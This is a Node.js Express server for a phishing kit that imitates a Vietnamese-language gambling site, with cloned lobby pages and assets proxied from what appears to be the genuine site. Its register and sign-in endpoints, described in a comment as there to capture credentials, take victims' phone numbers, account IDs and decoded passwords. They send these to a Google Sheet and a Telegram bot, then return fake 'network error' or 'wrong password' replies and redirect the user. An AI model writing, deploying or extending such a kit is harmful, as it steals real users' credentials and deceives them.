require('dotenv').config();
const express = require('express');
const path = require('path');
const session = require('express-session');

// Import utilities
const { googleSheetApi } = require('./utils/api');
const {
  sendRegisterAccountToBot,
  sendLoginAccountToBot,
} = require('./utils/sendTelegram');

// Import Routes
const adminRoutes = require('./routes/admin');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';

// Session setup
app.use(
  session({
    secret: 'tweb-admin-secret-key-98765',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }, // 1 day
  })
);

// App configuration
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.set('trust proxy', true);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Serve auth.js with cache control headers to prevent client caching issues
app.get('/js/auth.js', (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.sendFile(path.join(__dirname, 'public', 'js', 'auth.js'));
});

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to proxy and cache missing static assets dynamically from the reference site
app.use((req, res, next) => {
  if (req.method !== 'GET') return next();
  
  const isAsset = /\.(png|jpe?g|gif|svg|ico|webp|css|js|woff2?|ttf|otf|mp3|mp4)$/i.test(req.path) || 
                  req.path.startsWith('/img.alltocon.com/') || 
                  req.path.startsWith('/img.alltocon.com');
                  
  if (!isAsset) return next();
  
  const fs = require('fs');
  const https = require('https');
  
  const localPath = path.join(__dirname, 'public', req.path);
  if (fs.existsSync(localPath)) {
    return next();
  }
  
  let remoteUrl = '';
  if (req.path.startsWith('/img.alltocon.com/')) {
    remoteUrl = `https:/${req.path}`;
  } else if (req.path.startsWith('/img.alltocon.com')) {
    remoteUrl = `https:/${req.path}`;
  } else {
    remoteUrl = `https://www.t12026ga6789.com${req.path}`;
  }
  
  const cleanPath = localPath.split('?')[0];
  const dir = path.dirname(cleanPath);
  
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  
  const fileStream = fs.createWriteStream(cleanPath);
  https.get(remoteUrl, (response) => {
    if (response.statusCode === 200) {
      response.pipe(fileStream);
      fileStream.on('finish', () => {
        fileStream.close();
        res.sendFile(cleanPath);
      });
    } else {
      fileStream.close();
      if (fs.existsSync(cleanPath)) fs.unlinkSync(cleanPath);
      next();
    }
  }).on('error', () => {
    fileStream.close();
    if (fs.existsSync(cleanPath)) fs.unlinkSync(cleanPath);
    next();
  });
});


// Middleware to automatically detect mobile User-Agents and render mobile views if available
app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  const isMobile = /mobile|android|iphone|ipad|phone/i.test(ua) || req.query.device === 'mobile' || req.query.mobile === 'true';
  
  const originalRender = res.render;
  res.render = function (view, options, callback) {
    if (isMobile && typeof view === 'string' && !view.startsWith('admin/')) {
      const mobileView = `mobile/${view}`;
      const viewPath = path.join(__dirname, 'views', `${mobileView}.ejs`);
      const fs = require('fs');
      if (fs.existsSync(viewPath)) {
        return originalRender.call(this, mobileView, options, callback);
      }
    }
    return originalRender.call(this, view, options, callback);
  };
  next();
});

// Global app locals initialization
app.locals.domainConfig = {
  redirectDomain: process.env.REDIRECT_DOMAIN || '',
  regDomain: process.env.REG_DOMAIN || '',
  loginDomain: process.env.LOGIN_DOMAIN || '',
};
app.locals.recentLogs = [];

// Helper functions
function getIp(req) {
  const ip =
    req.headers['cf-connecting-ip'] ||
    req.headers['x-real-ip'] ||
    req.headers['x-forwarded-for'] ||
    req.socket.remoteAddress ||
    '127.0.0.1';
  return ip.toString();
}

const handleApiResponse = async (req, res, actionType) => {
  try {
    const timeNow = new Date().toLocaleString('vi-VN', {
      timeZone: 'Asia/Ho_Chi_Minh',
    });
    const userIp = getIp(req);

    let data = {
      action: actionType,
      timeNow,
      userIp,
      ...req.body,
    };

    if (actionType === 'register') {
      let password = req.body.PWD || '';
      // Decode base64 if it's base64 encoded
      try {
        if (/^[a-zA-Z0-9+/]+={0,2}$/.test(password) && password.length % 4 === 0) {
          password = Buffer.from(password, 'base64').toString('utf-8');
        }
      } catch (e) {
        // use raw password if decoding fails
      }
      data.PWD = password;

      // Log registration to Admin Panel
      const recentLogs = req.app.locals.recentLogs || [];
      recentLogs.push({
        action: 'register',
        accountId: req.body.AccountID || req.body.CellPhone || 'Unknown',
        phone: req.body.CellPhone || '',
        ip: userIp,
        time: timeNow,
      });
      if (recentLogs.length > 100) recentLogs.shift();

      await Promise.all([
        googleSheetApi.storageDataRegisterToGoogleSheet(data, process.env.GOOGLE_SHEET_URL),
        sendRegisterAccountToBot(
          req.body.CellPhone || '',
          req.body.AccountID || '',
          req.body.NickName || '',
          userIp,
          timeNow,
          password
        ),
      ]);

      const { regDomain, redirectDomain } = req.app.locals.domainConfig;
      return res.json({
        Error: {
          Code: 5999,
          Message: 'Lỗi mạng, vui lòng làm mới giao diện',
          Redirect: regDomain || redirectDomain || '/',
        },
      });
    } else if (actionType === 'login') {
      // Log login to Admin Panel
      const recentLogs = req.app.locals.recentLogs || [];
      recentLogs.push({
        action: 'login',
        accountId: req.body.AccountID || req.body.phone || 'Unknown',
        phone: req.body.phone || '',
        ip: userIp,
        time: timeNow,
      });
      if (recentLogs.length > 100) recentLogs.shift();

      await Promise.all([
        googleSheetApi.storageDataLoginToGoogleSheet(data, process.env.GOOGLE_SHEET_URL),
        sendLoginAccountToBot(
          userIp,
          timeNow,
          req.body.phone || '',
          req.body.AccountID || '',
          req.body.AccountPWD || ''
        ),
      ]);

      const { loginDomain, redirectDomain } = req.app.locals.domainConfig;
      return res.json({
        Error: { 
          Code: 1002, 
          Message: 'Tài khoản hoặc mật khẩu sai',
          Redirect: loginDomain || redirectDomain || '/'
        },
      });
    }
  } catch (error) {
    console.error(error);
    return res.status(500).json({ message: 'Error processing data' });
  }
};

// Admin panel route
app.use('/admin', adminRoutes);

// Home route
app.get('/', (req, res) => {
  res.render('index');
});

// Promotions route
app.get('/promotions', (req, res) => {
  res.render('promotions');
});

// Signup route
app.get('/signup', (req, res) => {
  res.render('signup');
});

// Login route
app.get('/login', (req, res) => {
  res.render('login');
});


// Lobby routes
app.get('/gamelobby/animal', (req, res) => {
  res.render('animal');
});

app.get('/gamelobby/sports', (req, res) => {
  res.render('sports');
});

app.get('/gamelobby/live', (req, res) => {
  res.render('live');
});

app.get('/gamelobby/egame', (req, res) => {
  res.render('egame');
});

app.get('/gamelobby/mpg', (req, res) => {
  res.render('mpg');
});

app.get('/gamelobby/esports', (req, res) => {
  res.render('esports');
});

app.get('/gamelobby/chess', (req, res) => {
  res.render('chess');
});

app.get('/gamelobby/lottery', (req, res) => {
  res.render('lottery');
});

// QR download page route
app.get('/page/QR', (req, res) => {
  res.render('qr');
});

// VIP route
app.get('/myvip', (req, res) => {
  res.render('myvip');
});

// API endpoints to mock standard actions and capture credentials
app.post('/api/Common/GetVerifyMode', (req, res) => {
  res.json({ Data: 1 });
});

app.post('/api/Verify/VerifyAccountIDIsExist', (req, res) => {
  res.json({
    Data: {
      AccountList: null,
      CanUse: true,
      CookieID: '0ce10a162e074dc8ba54980782e743db',
      IsOverIpLimit: false,
      VerifyStatus: 0,
    },
  });
});

app.post('/api/Common/IsMemberRegisterEnabled', (req, res) => {
  res.json({ Data: true });
});

app.post('/api/MemberInfo/RegisterMember', (req, res) =>
  handleApiResponse(req, res, 'register')
);

app.post('/api/Authorize/SignIn', (req, res) =>
  handleApiResponse(req, res, 'login')
);

// Catch-all: serve index for SPA-like behavior
app.get(/.*/, (req, res) => {
  res.render('index');
});

app.listen(PORT, HOST, () => {
  console.log(`Server running at http://${HOST}:${PORT}`);
});
